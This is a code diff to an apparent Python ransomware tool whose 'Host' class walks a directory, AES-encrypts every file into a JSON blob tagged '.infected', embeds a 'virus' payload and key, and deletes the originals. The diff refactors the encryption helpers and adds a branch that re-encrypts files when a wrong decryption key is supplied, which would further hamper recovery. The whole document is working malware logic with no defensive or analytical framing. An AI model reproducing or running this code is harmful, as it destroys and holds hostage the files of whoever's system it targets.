@@ -53,21 +53,16 @@ class WormDigest:
     def EncodeAES(self, plaintext):
         if isinstance(plaintext, str):
             plaintext = plaintext.encode('utf-8')
-        return base64.urlsafe_b64encode(self.cipher.encrypt(
-                pad(
-                    plaintext, AES.block_size
-                )
-            )
-        ).decode('utf-8')
+        padded = pad(plaintext, AES.block_size)
+        enc = self.cipher.encrypt(padded)
+        return base64.urlsafe_b64encode(enc).decode('utf-8')
 
     def DecodeAES(self, ciphertext):
         if isinstance(ciphertext, str):
             ciphertext = ciphertext.encode()
-        return unpad(
-                self.cipher.decrypt(
-                    base64.urlsafe_b64decode(ciphertext)
-                ), AES.block_size
-            ).decode('utf-8')
+        enc = base64.urlsafe_b64decode(ciphertext)
+        unpadded = self.cipher.decrypt(enc)
+        return unpad(unpadded, AES.block_size).decode("utf-8")
 
 
 @dataclass
@@ -143,47 +138,55 @@ class Host:
                 self.fs_scan_list.append(os.path.join(root, file))
         return self
 
-    def encrypt(self, delimiter="|:|", suffix=".infected"):
-        for file in self.fs_scan_list:
-            with open(file, 'rb') as fin:
+    def encrypt(self, key=None, delimiter="|:|", infected_tag=".infected"):
+        if not key:
+            cipher = self.crypto
+        else:
+            cipher = WormDigest()
+            cipher.cipher = AES.new(key, AES.MODE_ECB)
+        for filename in self.fs_scan_list:
+            with open(filename, 'rb') as fin:
                 data_read = fin.read()
                 encrypted_data = {
-                    "checksum": self.crypto.ChecksumSHA512(data_read),
-                    "fileData": self.crypto.EncodeAES(data_read),
-                    "encryptedVirus": self.crypto.EncodeAES(
-                        self.crypto.EncodeAES(
+                    "checksum": cipher.ChecksumSHA512(data_read),
+                    "fileData": cipher.EncodeAES(data_read),
+                    "encryptedVirus": cipher.EncodeAES(
+                        cipher.EncodeAES(
                             time.time().hex().encode()
-                        ) + delimiter + self.crypto.EncodeAES(self.crypto.virus_data)
+                        ) + delimiter + cipher.EncodeAES(cipher.virus_data)
                     ),
-                    "iv": self.crypto.EncodeAES(self.crypto.EncodeAES(
+                    "iv": cipher.EncodeAES(cipher.EncodeAES(
                         time.time().hex().encode()
-                    ) + delimiter + self.crypto.EncodeAES(self.crypto.config.key))
+                    ) + delimiter + cipher.EncodeAES(cipher.config.key))
                 }
-            with open(file+suffix, 'w') as fout:
+            with open(filename + infected_tag, 'w') as fout:
                 json.dump(encrypted_data, fout, indent=2)
-                os.remove(file)
+                os.remove(filename)
         return self
 
     def decrypt(self, key, delimiter="|:|", clean_tag=".clean", infected_tag=".infected"):
         if not key:
-            sys.stdout.write("[!] key was not provided [!]")
+            sys.stdout.write("\n[!] key was not provided [!]")
             sys.exit(0)
         wd = WormDigest()
         wd.cipher = AES.new(key, AES.MODE_ECB)
         if wd.EncodeAES(delimiter.encode()) != self.crypto.EncodeAES(delimiter.encode()):
-            sys.stdout.write("[!] key is wrong , did not passed delimiter test [!]")
-            sys.exit(0)
+            sys.stdout.write("\n[!] key is wrong , did not passed delimiter test [!]")
+            sys.stdout.write("\n[DIGESTING]("+str(key)+","+str(hex(id(wd.cipher)))+")")
+            self.encrypt(key, delimiter, infected_tag)
+            sys.stdout.write("\n[ENCRYPTING] file was re-encrypted")
+            sys.exit(1)
+
         if os.path.isdir(self.crypto.config.scan):
             for root, dirs, files in os.walk(self.crypto.config.scan):
                 for name in files:
                     if infected_tag in name:
-                        fn = os.path.join(root, name)
-                        with open(fn, "rb") as fin:
+                        filename = os.path.join(root, name)
+                        with open(filename, "rb") as fin:
                             encrypted_data = json.load(fin)
-                        filename = fn + clean_tag
-                        with open(filename, "w") as fout:
+                        with open(filename + clean_tag, "w") as fout:
                             fout.write(wd.DecodeAES(encrypted_data["fileData"]))
-                        os.remove(os.path.join(root, name))
+                        os.remove(filename)
         else:
             with open(self.crypto.config.scan, 'rb') as fin:
                 encrypted_data = json.load(fin)
@@ -206,12 +209,12 @@ def run(args):
     host.refresh()
     if args.encrypt:
         host.crypto.scan = args.encrypt
-        sys.stdout.write("[ENCRYPTING]")
+        sys.stdout.write("\n[ENCRYPTING]")
         host.encrypt()
         sys.exit(0)
     if args.decrypt and args.key:
         host.crypto.config.scan = args.decrypt
-        sys.stdout.write("[DECRYPTING]")
+        sys.stdout.write("\n[DECRYPTING]")
         host.decrypt(args.key.encode())
         sys.exit(0)
 
